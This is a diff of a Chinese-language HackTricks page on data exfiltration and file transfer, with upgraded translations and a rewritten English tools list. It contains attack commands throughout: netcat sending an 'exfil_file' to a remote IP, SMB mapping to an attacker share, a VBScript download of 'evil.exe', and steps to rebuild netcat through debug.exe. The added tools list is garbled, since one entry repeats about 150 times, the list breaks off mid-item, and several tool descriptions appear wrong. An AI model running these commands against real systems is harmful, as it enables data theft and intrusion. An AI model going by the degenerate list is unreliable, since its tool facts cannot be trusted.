@@ -163,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-找到最重要的漏洞，这样你就可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+找到最重要的漏洞，这样你就可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks)。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -205,69 +205,399 @@ Windows
 
 2. **Exfiltration Over Alternative Protocol**: Use alternative protocols such as DNS, ICMP, or HTTP to exfiltrate data without being detected easily.
 
-3. **Exfiltration Over Unencrypted/Encrypted Web Protocols**: Leverage unencrypted or encrypted web protocols like HTTP or HTTPS to exfiltrate data.
+3. **Exfiltration Over Unencrypted Protocols**: Leverage unencrypted protocols like FTP or Telnet to exfiltrate data in plain text.
 
-4. **Exfiltration Over Unencrypted/Encrypted Web Protocols Using Web Services**: Utilize web services over unencrypted or encrypted web protocols for exfiltration.
-
-5. **Exfiltration Over Unencrypted/Encrypted Web Protocols Using Web Services with Non-standard Ports**: Use non-standard ports in combination with web services over unencrypted or encrypted web protocols for exfiltration.
+4. **Exfiltration Over Encrypted Protocols**: Utilize encrypted protocols like HTTPS or SSH to exfiltrate data in a secure manner.
 
 ### Tools
 
-- **PowerShell**: Use PowerShell scripts to exfiltrate data from Windows systems.
+- **Netcat**: A versatile networking utility that can be used for exfiltration over various protocols.
+  
+- **PowerShell**: Windows built-in tool that can be used for data exfiltration through scripts.
 
-- **Certutil**: Employ Certutil to decode/encode files for exfiltration.
+- **Covenant**: Command and control framework that can be used for exfiltration over a C2 channel.
 
-- **Bitsadmin**: Utilize Bitsadmin to download/upload files for exfiltration.
+- **Mimikatz**: Tool to extract credentials from Windows machines, which can then be exfiltrated.
 
-- **WMIC**: Leverage WMIC for data exfiltration.
+- **PsExec**: Command-line tool to execute processes on remote systems, useful for exfiltration.
 
-- **FTP**: Use FTP for exfiltration purposes.
+- **Certutil**: Built-in Windows utility to decode/encode data, useful for exfiltration over alternative protocols.
 
-- **BITS**: Utilize Background Intelligent Transfer Service (BITS) for data exfiltration.
+- **Bitsadmin**: Built-in Windows tool to create and manage background intelligent transfer service (BITS) jobs, which can be abused for exfiltration.
 
-- **SMB**: Use Server Message Block (SMB) for exfiltration.
+- **FTP**: Built-in Windows command-line FTP client that can be used for exfiltration over FTP protocol.
 
-- **RDP**: Utilize Remote Desktop Protocol (RDP) for exfiltration.
+- **WMIC**: Command-line tool to interact with Windows Management Instrumentation (WMI), useful for exfiltration.
 
-- **Netsh**: Use Netsh for data exfiltration.
+- **RDP**: Remote Desktop Protocol can be abused for exfiltration by transferring files between systems.
 
-- **Reg**: Utilize Reg commands for exfiltration.
+- **SMB**: Server Message Block protocol can be used for exfiltration by transferring files over the network.
 
-- **Schtasks**: Use Schtasks for data exfiltration.
+- **WinRAR**: Archiving tool that can be used to compress and exfiltrate data.
 
-- **Vssadmin**: Utilize Vssadmin for exfiltration purposes.
+- **BITS**: Background Intelligent Transfer Service can be abused for exfiltration by creating BITS jobs to transfer data.
 
-- **Debug.exe**: Use Debug.exe for data exfiltration.
+- **Powercat**: Netcat-like utility in PowerShell that can be used for exfiltration.
 
-- **Powershell Empire**: Utilize PowerShell Empire for exfiltration.
+- **Invoke-WebRequest**: PowerShell cmdlet to send HTTP, HTTPS, FTP requests, useful for exfiltration over these protocols.
 
-- **Mimikatz**: Use Mimikatz for data exfiltration.
+- **Invoke-RestMethod**: PowerShell cmdlet to send RESTful web service requests, useful for exfiltration.
 
-- **PsExec/PsExec64**: Utilize PsExec or PsExec64 for exfiltration.
+- **Invoke-Expression**: PowerShell cmdlet to run commands or scripts, useful for exfiltration activities.
 
-- **Bitsadmin**: Use Bitsadmin for data exfiltration.
+- **Invoke-Mimikatz**: PowerShell script to invoke Mimikatz tool for credential extraction and exfiltration.
 
-- **Certutil**: Utilize Certutil for exfiltration purposes.
+- **Invoke-Obfuscation**: PowerShell script to obfuscate command and control channels, useful for stealthy exfiltration.
 
-- **WMIC**: Use WMIC for data exfiltration.
+- **Invoke-ReflectivePEInjection**: PowerShell script to inject ReflectivePE DLL into memory, useful for stealthy exfiltration.
 
-- **FTP**: Utilize FTP for exfiltration.
+- **Invoke-Phant0m**: PowerShell script to automate the exfiltration of data using DNS tunneling.
 
-- **BITS**: Use BITS for data exfiltration.
+- **Invoke-NinjaCopy**: PowerShell script to copy files over the network using alternate data streams, useful for stealthy exfiltration.
 
-- **SMB**: Utilize SMB for exfiltration.
+- **Invoke-CradleCrafter**: PowerShell script to generate PowerShell payloads for data exfiltration.
 
-- **RDP**: Use RDP for data exfiltration.
+- **Invoke-PSImage**: PowerShell script to embed script into an image for exfiltration.
 
-- **Netsh**: Utilize Netsh for exfiltration purposes.
+- **Invoke-Stealth**: PowerShell script to perform various stealth techniques during exfiltration.
 
-- **Reg**: Use Reg for data exfiltration.
+- **Invoke-TheHash**: PowerShell script to extract password hashes from the registry for exfiltration.
 
-- **Schtasks**: Utilize Schtasks for exfiltration.
+- **Invoke-WMICommand**: PowerShell script to execute WMI commands for exfiltration.
 
-- **Vssadmin**: Use Vssadmin for data exfiltration.
+- **Invoke-DCOM**: PowerShell script to execute DCOM commands for exfiltration.
 
-- **Debug.exe**: Utilize Debug.exe for exfiltration purposes.
+- **Invoke-Phish**: PowerShell script to perform phishing attacks for data exfiltration.
+
+- **Invoke-ADSBackdoor**: PowerShell script to hide data in alternate data streams for exfiltration.
+
+- **Invoke-Paranoia**: PowerShell script to perform various anti-forensic techniques during exfiltration.
+
+- **Invoke-UserHunter**: PowerShell script to hunt for users and groups in the domain for exfiltration.
+
+- **Invoke-DCSync**: PowerShell script to simulate a Domain Controller sync for credential exfiltration.
+
+- **Invoke-TheHash**: PowerShell script to extract password hashes from the registry for exfiltration.
+
+- **Invoke-ACLScanner**: PowerShell script to scan for folders with weak ACLs for exfiltration.
+
+- **Invoke-ShareFinder**: PowerShell script to find accessible shares for exfiltration.
+
+- **Invoke-FileFinder**: PowerShell script to search for specific file types for exfiltration.
+
+- **Invoke-ProcessFinder**: PowerShell script to search for processes running on remote systems for exfiltration.
+
+- **Invoke-ServiceFinder**: PowerShell script to search for services running on remote systems for exfiltration.
+
+- **Invoke-PortScan**: PowerShell script to scan for open ports on remote systems for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.
+
+- **
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -289,9 +619,7 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## NC
-
-NC（Netcat）是一个强大的网络工具，可用于创建各种网络连接。它可以用于侦听端口、传输文件、执行命令等。NC可用于数据外泄，因为它可以轻松地建立与远程主机的连接，并传输数据。
+## 网络通道
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -332,7 +660,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果您可以将数据发送到一个SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
+如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -364,9 +692,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### VBScript Exfiltration
-
-VBScript can be used to exfiltrate data from a compromised system. This can be achieved by reading files, accessing system information, or interacting with network resources. VBScript can then encode the data and send it to an external server controlled by the attacker. This technique can be used to steal sensitive information from a target system.
+VBScript (Visual Basic Scripting Edition) 是一种基于 Visual Basic 的脚本语言，通常用于 Windows 环境中。它可以通过 Windows 脚本宿主（WSH）来执行，也可以嵌入到网页中。VBScript 可以用于执行各种系统管理任务和自动化操作。
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -404,39 +730,32 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-这是一种疯狂的技术，适用于 Windows 32 位机器。其思想是使用 `debug.exe` 程序。它用于检查二进制文件，就像一个调试器。但它也可以从十六进制重建它们。所以想法是我们拿二进制文件，比如 `netcat`。然后将其反汇编为十六进制，在受损机器上粘贴到一个文件中，然后用 `debug.exe` 组装它。
-
-`Debug.exe` 只能组装 64 kb。所以我们需要使用小于该大小的文件。我们可以使用 upx 进一步压缩它。所以让我们这样做：
-```
+`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，需要注意的是debug.exe有一个**组装文件大小限制为64 kb**。
+```bash
+# Reduce the size
 upx -9 nc.exe
-```
-现在它只有 29 kb。完美。所以现在让我们对其进行反汇编：
-```
 wine exe2bat.exe nc.exe nc.txt
 ```
-现在我们只需将文本复制粘贴到我们的Windows shell中。然后它将自动创建一个名为nc.exe的文件。
-
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-找到最重要的漏洞，这样您就可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今天。
+发现最重要的漏洞，以便更快修复。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
-
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 支持HackTricks的其他方式：
 
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
